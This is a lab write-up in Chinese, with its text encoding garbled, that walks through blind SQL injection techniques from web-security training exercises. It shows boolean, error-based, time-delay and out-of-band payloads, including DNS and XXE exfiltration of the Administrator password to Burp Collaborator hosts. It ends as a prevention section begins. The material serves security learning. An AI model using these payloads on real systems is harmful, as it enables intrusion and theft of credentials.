<p>æ­¤æŸ¥è¯¢å®¹æ˜“å—åˆ° SQL æ³¨å…¥æ”»å‡»ï¼Œä½†æŸ¥è¯¢ç»“æœä¸ä¼šè¿”å›ç»™ç”¨æˆ·ã€‚ä¸è¿‡ï¼Œåº”ç”¨ç¨‹åºçš„è¡Œä¸ºä¼šæ ¹æ®æŸ¥è¯¢æ˜¯å¦è¿”å›ä»»ä½•æ•°æ®è€Œæœ‰æ‰€ä¸åŒã€‚å¦‚æœ æäº¤å·²è¯†åˆ«çš„TrackingId ï¼ŒæŸ¥è¯¢å°†è¿”å›æ•°æ®ï¼Œ ä¼šåœ¨å“åº”ä¸­æ”¶åˆ°â€œæ¬¢è¿å›æ¥â€æ¶ˆæ¯ã€‚</p>
<p>æ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨è¿™ç§æ¡ä»¶æ¥è¿›è¡Œsqlæ³¨å…¥ï¼Œé€šè¿‡è§¦å‘ä¸åŒçš„å“åº”æ¥æ£€ç´¢ä¿¡æ¯<br>å‡è®¾å‘é€äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œå…¶ä¸­ä¾æ¬¡åŒ…å«ä»¥ä¸‹TrackingId cookie å€¼ï¼š</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">â€¦xyz&#x27; AND &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br><span class="line">â€¦xyz&#x27; AND &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">2</span>  </span><br></pre></td></tr></table></figure>
<p>è¿™äº›å€¼ä¸­çš„ç¬¬ä¸€ä¸ªå€¼å¯¼è‡´æŸ¥è¯¢è¿”å›ç»“æœï¼Œå› ä¸ºæ³¨å…¥çš„AND â€˜1â€™&#x3D;â€™1æ¡ä»¶ä¸ºçœŸã€‚ç»“æœï¼Œæ˜¾ç¤ºâ€œæ¬¢è¿å›æ¥â€æ¶ˆæ¯ã€‚<br>ç¬¬äºŒä¸ªå€¼å¯¼è‡´æŸ¥è¯¢ä¸è¿”å›ä»»ä½•ç»“æœï¼Œå› ä¸ºæ³¨å…¥çš„æ¡ä»¶ä¸ºå‡ã€‚ä¸æ˜¾ç¤ºâ€œæ¬¢è¿å›æ¥â€æ¶ˆæ¯ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºUsersçš„è¡¨ï¼Œå…¶ä¸­åŒ…å«Usernameå’ŒPasswordåˆ—ï¼Œä»¥åŠä¸€ä¸ªåä¸ºAdministratorçš„ç”¨æˆ·ã€‚ å¯ä»¥é€šè¿‡å‘é€ä¸€ç³»åˆ—è¾“å…¥æ¥ä¸€æ¬¡ä¸€ä¸ªå­—ç¬¦åœ°æµ‹è¯•å¯†ç ï¼Œä»è€Œç¡®å®šæ­¤ç”¨æˆ·çš„å¯†ç ã€‚</p>
<p>è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿç¡®å®šä»»ä½•å•ä¸ªæ³¨å…¥æ¡ä»¶çš„ç­”æ¡ˆï¼Œå¹¶ä¸€æ¬¡æå–ä¸€ä¸ªæ•°æ®ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºUsersçš„è¡¨ï¼Œå…¶ä¸­åŒ…å«Usernameå’ŒPasswordåˆ—ï¼Œä»¥åŠä¸€ä¸ªåä¸ºAdministratorçš„ç”¨æˆ·ã€‚ å¯ä»¥é€šè¿‡å‘é€ä¸€ç³»åˆ—è¾“å…¥æ¥ä¸€æ¬¡ä¸€ä¸ªå­—ç¬¦åœ°æµ‹è¯•å¯†ç ï¼Œä»è€Œç¡®å®šæ­¤ç”¨æˆ·çš„å¯†ç ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27;), 1, 1) &gt; &#x27;</span>m</span><br></pre></td></tr></table></figure></div>

<p>è¿™å°†è¿”å›â€œæ¬¢è¿å›æ¥â€æ¶ˆæ¯ï¼Œè¡¨æ˜æ³¨å…¥çš„æ¡ä»¶ä¸ºçœŸï¼Œå› æ­¤å¯†ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§äºm ã€‚</p>
<p>æœ€ç»ˆï¼Œæˆ‘ä»¬å‘é€ä»¥ä¸‹è¾“å…¥ï¼Œè¿”å›â€œæ¬¢è¿å›æ¥â€æ¶ˆæ¯ï¼Œä»è€Œç¡®è®¤å¯†ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯s ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27;), 1, 1) = &#x27;</span>s</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬å¯ä»¥ç»§ç»­è¿™ä¸ªè¿‡ç¨‹ï¼Œç³»ç»Ÿåœ°ç¡®å®šAdministratorç”¨æˆ·çš„å®Œæ•´å¯†ç ã€‚</p>
<p><img src="https://pic1.imgdb.cn/item/67c9c8d1066befcec6df56bb.png"><br>æ¯”å¦‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ ¹æ®è¿”å›çš„å†…å®¹æ˜¯å¦æœ‰welcomeåˆ¤æ–­ï¼Œç„¶ååˆ¤æ–­å‡ºäº†æœ‰usersè¡¨å’Œadministratorè¿™ä¸ªç”¨æˆ·ï¼Œç”¨æ¡ä»¶å“åº”æ¥ç¡®å®šå¯†ç çš„é•¿åº¦<br><img src="https://pic1.imgdb.cn/item/67c9ced3066befcec6df57d6.png"><br>ç„¶åç”¨substringè¿™ä¸ªå‡½æ•°ï¼Œæˆªå–å¯†ç é‡Œé¢çš„ä¸€ä¸ªå­—ï¼Œåœ¨substringçš„ç¬¬ä¸€ä¸ªæ•°å­—å’Œæœ€åçš„â€™aâ€™åŠ ä¸Šæ”»å‡»ç¬¦ï¼Œè¿›è¡Œåˆ¤æ–­ï¼Œç„¶åé€ä½çˆ†ç ´å‡ºå¯†ç </p>
<h3 id="åŸºäºé”™è¯¯çš„-SQL-æ³¨å…¥"><a href="#åŸºäºé”™è¯¯çš„-SQL-æ³¨å…¥" class="headerlink" title="åŸºäºé”™è¯¯çš„ SQL æ³¨å…¥"></a>åŸºäºé”™è¯¯çš„ SQL æ³¨å…¥</h3><p>åŸºäºé”™è¯¯çš„ SQL æ³¨å…¥æ˜¯æŒ‡ èƒ½å¤Ÿä½¿ç”¨é”™è¯¯æ¶ˆæ¯ä»æ•°æ®åº“ä¸­æå–æˆ–æ¨æ–­æ•æ„Ÿæ•°æ®çš„æƒ…å†µï¼Œå³ä½¿åœ¨ç›²ç›®æƒ…å†µä¸‹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¯èƒ½æ€§å–å†³äºæ•°æ®åº“çš„é…ç½®å’Œ èƒ½å¤Ÿè§¦å‘çš„é”™è¯¯ç±»å‹ï¼š</p>
<h4 id="é€šè¿‡è§¦å‘æ¡ä»¶é”™è¯¯æ¥åˆ©ç”¨ç›²-SQL-æ³¨å…¥"><a href="#é€šè¿‡è§¦å‘æ¡ä»¶é”™è¯¯æ¥åˆ©ç”¨ç›²-SQL-æ³¨å…¥" class="headerlink" title="é€šè¿‡è§¦å‘æ¡ä»¶é”™è¯¯æ¥åˆ©ç”¨ç›² SQL æ³¨å…¥"></a>é€šè¿‡è§¦å‘æ¡ä»¶é”™è¯¯æ¥åˆ©ç”¨ç›² SQL æ³¨å…¥</h4><p>æŸäº›åº”ç”¨ç¨‹åºæ‰§è¡Œ SQL æŸ¥è¯¢ï¼Œä½†æ— è®ºæŸ¥è¯¢æ˜¯å¦è¿”å›ä»»ä½•æ•°æ®ï¼Œå…¶è¡Œä¸ºéƒ½ä¸ä¼šæ”¹å˜ã€‚ä¸Šä¸€èŠ‚ä¸­çš„æŠ€æœ¯ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºæ³¨å…¥ä¸åŒçš„å¸ƒå°”æ¡ä»¶ä¸ä¼šå¯¹åº”ç”¨ç¨‹åºçš„å“åº”äº§ç”Ÿå½±å“ã€‚<br>é€šå¸¸ï¼Œå¯ä»¥æ ¹æ®æ˜¯å¦å‘ç”Ÿ SQL é”™è¯¯æ¥è¯±å¯¼åº”ç”¨ç¨‹åºè¿”å›ä¸åŒçš„å“åº”ã€‚ å¯ä»¥ä¿®æ”¹æŸ¥è¯¢ï¼Œä½¿å…¶ä»…åœ¨æ¡ä»¶ä¸ºçœŸæ—¶æ‰å¯¼è‡´æ•°æ®åº“é”™è¯¯ã€‚é€šå¸¸ï¼Œæ•°æ®åº“æŠ›å‡ºçš„æœªå¤„ç†é”™è¯¯ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºçš„å“åº”æœ‰æ‰€ä¸åŒï¼Œä¾‹å¦‚é”™è¯¯æ¶ˆæ¯ã€‚è¿™ä½¿ èƒ½å¤Ÿæ¨æ–­å‡ºæ³¨å…¥æ¡ä»¶çš„çœŸå®æ€§ã€‚<br>å‡è®¾å‘é€äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œå®ƒä»¬åˆ†åˆ«åŒ…å«ä»¥ä¸‹TrackingId cookie å€¼ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">xyz&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">THEN</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span>)=<span class="symbol">&#x27;a</span></span><br><span class="line">xyz&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span>)=<span class="symbol">&#x27;a</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™äº›è¾“å…¥ä½¿ç”¨CASEå…³é”®å­—æ¥æµ‹è¯•æ¡ä»¶ï¼Œå¹¶æ ¹æ®è¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸè¿”å›ä¸åŒçš„è¡¨è¾¾å¼</p>
<ul>
<li>å¯¹äºç¬¬ä¸€ä¸ªè¾“å…¥ï¼Œ CASEè¡¨è¾¾å¼è®¡ç®—ç»“æœä¸ºâ€™aâ€™ ï¼Œè¿™ä¸ä¼šå¯¼è‡´ä»»ä½•é”™è¯¯ã€‚</li>
<li>å¯¹äºç¬¬äºŒä¸ªè¾“å…¥ï¼Œå…¶è®¡ç®—ç»“æœä¸º1&#x2F;0 ï¼Œè¿™ä¼šå¯¼è‡´é™¤ä»¥é›¶çš„é”™è¯¯ã€‚<br>å¦‚æœé”™è¯¯å¯¼è‡´åº”ç”¨ç¨‹åºçš„ HTTP å“åº”å‡ºç°å·®å¼‚ï¼Œåˆ™å¯ä»¥ç”±æ­¤ç¡®å®šæ³¨å…¥çš„æ¡ä»¶æ˜¯å¦ä¸ºçœŸã€‚</li>
</ul>
<p>é€šè¿‡è¿™ä¸ªæ–¹æ³•å¯ä»¥ä¸€æ¬¡ç¡®å®šä¸€ä¸ªå­—ç¬¦</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (Username = &#x27;</span>Administrato<span class="string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END FROM Users)=&#x27;</span>a</span><br></pre></td></tr></table></figure></div>
<p>åˆ©ç”¨æ–¹å¼å’Œä¸Šä¸€é¢˜ä¹Ÿå¾ˆåƒï¼Œåªæ˜¯æˆ‘ä»¬è§‚å¯Ÿè¿”å›æœ‰æ²¡æœ‰é”™è¯¯<br><img src="https://pic1.imgdb.cn/item/67ca608b066befcec6dfa0b9.png"><br>q954u104nkbmrmvdwvft</p>
<h4 id="é€šè¿‡è¯¦ç»†çš„-SQL-é”™è¯¯æ¶ˆæ¯æå–æ•æ„Ÿæ•°æ®"><a href="#é€šè¿‡è¯¦ç»†çš„-SQL-é”™è¯¯æ¶ˆæ¯æå–æ•æ„Ÿæ•°æ®" class="headerlink" title="é€šè¿‡è¯¦ç»†çš„ SQL é”™è¯¯æ¶ˆæ¯æå–æ•æ„Ÿæ•°æ®"></a>é€šè¿‡è¯¦ç»†çš„ SQL é”™è¯¯æ¶ˆæ¯æå–æ•æ„Ÿæ•°æ®</h4><p>æ•°æ®åº“é…ç½®é”™è¯¯æœ‰æ—¶ä¼šå¯¼è‡´è¯¦ç»†çš„é”™è¯¯æ¶ˆæ¯ã€‚è¿™äº›æ¶ˆæ¯å¯èƒ½ä¼šä¸ºæ”»å‡»è€…æä¾›æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œè¯·è€ƒè™‘ä»¥ä¸‹é”™è¯¯æ¶ˆæ¯ï¼Œè¯¥æ¶ˆæ¯åœ¨å°†å•å¼•å·æ³¨å…¥idå‚æ•°åå‡ºç°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">Unterminated string literal started <span class="keyword">at</span> position <span class="number">52</span> <span class="keyword">in</span> <span class="keyword">SQL</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tracking <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;&#x27;. Expected char</span></span><br></pre></td></tr></table></figure></div>
<p>æœ‰æ—¶ï¼Œ å¯ä»¥è¯±å¯¼åº”ç”¨ç¨‹åºç”ŸæˆåŒ…å«æŸ¥è¯¢è¿”å›çš„éƒ¨åˆ†æ•°æ®çš„é”™è¯¯æ¶ˆæ¯ã€‚è¿™æœ‰æ•ˆåœ°å°†åŸæœ¬ç›²ç›®çš„ SQL æ³¨å…¥æ¼æ´å˜æˆäº†å¯è§æ¼æ´ã€‚<br> å¯ä»¥ä½¿ç”¨CAST()å‡½æ•°æ¥å®ç°è¿™ä¸€ç‚¹ã€‚å®ƒä½¿ èƒ½å¤Ÿå°†ä¸€ç§æ•°æ®ç±»å‹è½¬æ¢ä¸ºå¦ä¸€ç§æ•°æ®ç±»å‹ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªæŸ¥è¯¢åŒ…å«ä»¥ä¸‹è¯­å¥ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">CAST((<span class="keyword">SELECT</span> example_column <span class="keyword">FROM</span> example_table) <span class="keyword">AS</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure></div>
<p>é€šå¸¸ï¼Œ å°è¯•è¯»å–çš„æ•°æ®æ˜¯å­—ç¬¦ä¸²ã€‚å°è¯•å°†å…¶è½¬æ¢ä¸ºä¸å…¼å®¹çš„æ•°æ®ç±»å‹ï¼ˆä¾‹å¦‚int ï¼‰å¯èƒ½ä¼šå¯¼è‡´ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„é”™è¯¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>invalid input syntax for type integer: &quot;Example data&quot;</span><br></pre></td></tr></table></figure></div>

<h4 id="é€šè¿‡è§¦å‘æ—¶é—´å»¶è¿Ÿæ¥åˆ©ç”¨ç›²-SQL-æ³¨å…¥"><a href="#é€šè¿‡è§¦å‘æ—¶é—´å»¶è¿Ÿæ¥åˆ©ç”¨ç›²-SQL-æ³¨å…¥" class="headerlink" title="é€šè¿‡è§¦å‘æ—¶é—´å»¶è¿Ÿæ¥åˆ©ç”¨ç›² SQL æ³¨å…¥"></a>é€šè¿‡è§¦å‘æ—¶é—´å»¶è¿Ÿæ¥åˆ©ç”¨ç›² SQL æ³¨å…¥</h4><p>å¦‚æœåº”ç”¨ç¨‹åºåœ¨æ‰§è¡Œ SQL æŸ¥è¯¢æ—¶æ•è·æ•°æ®åº“é”™è¯¯å¹¶å¦¥å–„å¤„ç†å®ƒä»¬ï¼Œåˆ™åº”ç”¨ç¨‹åºçš„å“åº”ä¸ä¼šæœ‰ä»»ä½•å·®å¼‚ã€‚è¿™æ„å‘³ç€ä»¥å‰ç”¨äºè¯±å¯¼æ¡ä»¶é”™è¯¯çš„æŠ€æœ¯å°†ä¸èµ·ä½œç”¨ã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡è§¦å‘æ—¶é—´å»¶è¿Ÿï¼ˆå…·ä½“å–å†³äºæ³¨å…¥æ¡ä»¶æ˜¯çœŸè¿˜æ˜¯å‡ï¼‰æ¥åˆ©ç”¨ç›² SQL æ³¨å…¥æ¼æ´ã€‚ç”±äºåº”ç”¨ç¨‹åºé€šå¸¸åŒæ­¥å¤„ç† SQL æŸ¥è¯¢ï¼Œå› æ­¤å»¶è¿Ÿæ‰§è¡Œ SQL æŸ¥è¯¢ä¹Ÿä¼šå»¶è¿Ÿ HTTP å“åº”ã€‚è¿™å…è®¸ æ ¹æ®æ¥æ”¶ HTTP å“åº”æ‰€èŠ±è´¹çš„æ—¶é—´æ¥ç¡®å®šæ³¨å…¥æ¡ä»¶çš„çœŸå®æ€§ã€‚<br>è§¦å‘æ—¶é—´å»¶è¿Ÿçš„æŠ€æœ¯ç‰¹å®šäºæ‰€ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹ã€‚ä¾‹å¦‚ï¼Œåœ¨ Microsoft SQL Server ä¸Šï¼Œ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æµ‹è¯•æ¡ä»¶å¹¶æ ¹æ®è¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸè§¦å‘å»¶è¿Ÿï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span>0:0:10<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">&#x27;</span>; <span class="keyword">IF</span> (<span class="attribute">1</span>=1) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span>--</span><br></pre></td></tr></table></figure></div>
<p>ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€æ¬¡æµ‹è¯•ä¸€ä¸ªå­—ç¬¦æ¥æ£€ç´¢æ•°æ®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:&#123;delay&#125;<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
<h4 id="ä½¿ç”¨å¸¦å¤–-OAST-æŠ€æœ¯åˆ©ç”¨ç›²-SQL-æ³¨å…¥"><a href="#ä½¿ç”¨å¸¦å¤–-OAST-æŠ€æœ¯åˆ©ç”¨ç›²-SQL-æ³¨å…¥" class="headerlink" title="ä½¿ç”¨å¸¦å¤– (OAST) æŠ€æœ¯åˆ©ç”¨ç›² SQL æ³¨å…¥"></a>ä½¿ç”¨å¸¦å¤– (OAST) æŠ€æœ¯åˆ©ç”¨ç›² SQL æ³¨å…¥</h4><p>åº”ç”¨ç¨‹åºå¯èƒ½ä¼šæ‰§è¡Œä¸ä¸Šä¸€ä¸ªç¤ºä¾‹ç›¸åŒçš„ SQL æŸ¥è¯¢ï¼Œä½†ä»¥å¼‚æ­¥æ–¹å¼æ‰§è¡Œã€‚åº”ç”¨ç¨‹åºç»§ç»­åœ¨åŸå§‹çº¿ç¨‹ä¸­å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶ä½¿ç”¨å¦ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨è·Ÿè¸ª cookie æ‰§è¡Œ SQL æŸ¥è¯¢ã€‚è¯¥æŸ¥è¯¢ä»ç„¶å®¹æ˜“å—åˆ° SQL æ³¨å…¥æ”»å‡»ï¼Œä½†åˆ°ç›®å‰ä¸ºæ­¢æè¿°çš„ä»»ä½•æŠ€æœ¯éƒ½ä¸èµ·ä½œç”¨ã€‚åº”ç”¨ç¨‹åºçš„å“åº”ä¸ä¾èµ–äºæŸ¥è¯¢è¿”å›çš„ä»»ä½•æ•°æ®ã€å‘ç”Ÿçš„æ•°æ®åº“é”™è¯¯æˆ–æ‰§è¡ŒæŸ¥è¯¢æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡è§¦å‘ä¸ æ§åˆ¶çš„ç³»ç»Ÿä¹‹é—´çš„å¸¦å¤–ç½‘ç»œäº¤äº’æ¥åˆ©ç”¨ç›² SQL æ³¨å…¥æ¼æ´ã€‚è¿™äº›å¯ä»¥æ ¹æ®æ³¨å…¥çš„æ¡ä»¶è§¦å‘ï¼Œä»¥ä¸€æ¬¡æ¨æ–­ä¸€æ¡ä¿¡æ¯ã€‚æ›´æœ‰ç”¨çš„æ˜¯ï¼Œæ•°æ®å¯ä»¥ç›´æ¥åœ¨ç½‘ç»œäº¤äº’ä¸­æ³„éœ²ã€‚<br>æœ‰å¤šç§ç½‘ç»œåè®®å¯ç”¨äºæ­¤ç›®çš„ï¼Œä½†é€šå¸¸æœ€æœ‰æ•ˆçš„æ˜¯ DNSï¼ˆåŸŸåæœåŠ¡ï¼‰ã€‚è®¸å¤šç”Ÿäº§ç½‘ç»œå…è®¸ DNS æŸ¥è¯¢è‡ªç”±å‡ºç«™ï¼Œå› ä¸ºå®ƒä»¬å¯¹äºç”Ÿäº§ç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œè‡³å…³é‡è¦ã€‚<br>è§¦å‘ DNS æŸ¥è¯¢çš„æŠ€æœ¯ç‰¹å®šäºæ‰€ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹ã€‚ä¾‹å¦‚ï¼ŒMicrosoft SQL Server ä¸Šçš„ä»¥ä¸‹è¾“å…¥å¯ç”¨äºåœ¨æŒ‡å®šåŸŸä¸Šå¼•å‘ DNS æŸ¥æ‰¾ï¼š</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;; exec master..xp_dirtree &#x27;<span class="comment">//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a&#x27;--</span></span><br></pre></td></tr></table></figure>
<p>ç¡®è®¤äº†è§¦å‘å¸¦å¤–äº¤äº’çš„æ–¹æ³•åï¼Œä½ å°±å¯ä»¥ä½¿ç”¨å¸¦å¤–é€šé“ä»æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­çªƒå–æ•°æ®ã€‚ä¾‹å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#x27;</span>Administrato<span class="string">r&#x27;);exec(&#x27;</span>master..xp_dirtree <span class="string">&quot;//&#x27;+@p+&#x27;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;</span><span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure></div>
<p>æ­¤è¾“å…¥è¯»å–Administratorç”¨æˆ·çš„å¯†ç ï¼Œé™„åŠ å”¯ä¸€çš„ Collaborator å­åŸŸï¼Œå¹¶è§¦å‘ DNS æŸ¥æ‰¾ã€‚æ­¤æŸ¥æ‰¾å…è®¸ æŸ¥çœ‹æ•è·çš„å¯†ç ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">S3cure<span class="selector-class">.cwcsgt05ikji0n1f2qlzn5118sek29</span><span class="selector-class">.burpcollaborator</span>.net</span><br></pre></td></tr></table></figure></div>
<p>ï¼ˆå…³äºè¿™äº›dnsçš„payloadéƒ½åœ¨<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet%EF%BC%89">https://portswigger.net/web-security/sql-injection/cheat-sheetï¼‰</a><br><img src="https://pic1.imgdb.cn/item/67caac3a066befcec6e0368e.png"><br>å¦‚æœåœ¨COLLABORATORä¸­çœ‹åˆ°è®¿é—®è®°å½•çš„è¯ï¼Œå°±è¯´æ˜æˆåŠŸäº†<br>å¸¦å¤– (OAST) æŠ€æœ¯æ˜¯æ£€æµ‹å’Œåˆ©ç”¨ç›² SQL æ³¨å…¥çš„æœ‰æ•ˆæ–¹æ³•ï¼Œå› ä¸ºå®ƒçš„æˆåŠŸç‡å¾ˆé«˜ï¼Œå¹¶ä¸”èƒ½å¤Ÿç›´æ¥çªƒå–å¸¦å¤–é€šé“å†…çš„æ•°æ®ã€‚å› æ­¤ï¼Œå³ä½¿åœ¨å…¶ä»–ç›²ç›®åˆ©ç”¨æŠ€æœ¯æœ‰æ•ˆçš„æƒ…å†µä¸‹ï¼ŒOAST æŠ€æœ¯é€šå¸¸ä¹Ÿæ˜¯é¦–é€‰ã€‚<br>æ¯”å¦‚åˆ©ç”¨ä¸‹é¢è¿™ä¸ªpayloadæ‹¿åˆ°adminçš„å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;<span class="meta">&lt;!DOCTYPE+root+[+<span class="meta">&lt;!ENTITY+%25</span></span></span><br><span class="line"><span class="meta"><span class="meta">+remote+SYSTEM+<span class="string">&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">+%25remote%3b]&gt;</span>&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure></div>
<p>åœ¨COLLABORATORçš„å“åº”ä¸­çœ‹åˆ°çš„dnsåœ¨COLLABORATOR payloadå‰é¢çš„å­—ç¬¦ä¸²å°±æ˜¯å¯†ç <br><img src="https://pic1.imgdb.cn/item/67caaf48066befcec6e03c91.png"></p>
<h2 id="å¦‚ä½•é˜²æ­¢sqlæ³¨å…¥"><a href="#å¦‚ä½•é˜²æ­¢sqlæ³¨å…¥" class="headerlink" title="å¦‚ä½•é˜²æ­¢sqlæ³¨å…¥"></a>å¦‚ä½•é˜²æ­¢sqlæ³¨å…¥</h2><p> å¯ä»¥ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼ˆè€Œä¸æ˜¯æŸ¥è¯¢ä¸­çš„å­—ç¬¦ä¸²è¿æ¥ï¼‰æ¥é˜²æ­¢å¤§å¤šæ•° SQL æ³¨å…¥å®ä¾‹ã€‚è¿™äº›å‚æ•°åŒ–æŸ¥è¯¢ä¹Ÿç§°ä¸ºâ€œå‡†å¤‡å¥½çš„è¯­å¥â€ã€‚<br>ä¸‹ä»£ç å®¹æ˜“å—åˆ° SQL æ³¨å…¥æ”»å‡»ï¼Œå› ä¸ºç”¨æˆ·è¾“å…¥ç›´æ¥è¿æ¥åˆ°æŸ¥è¯¢ä¸­ï¼š</p>
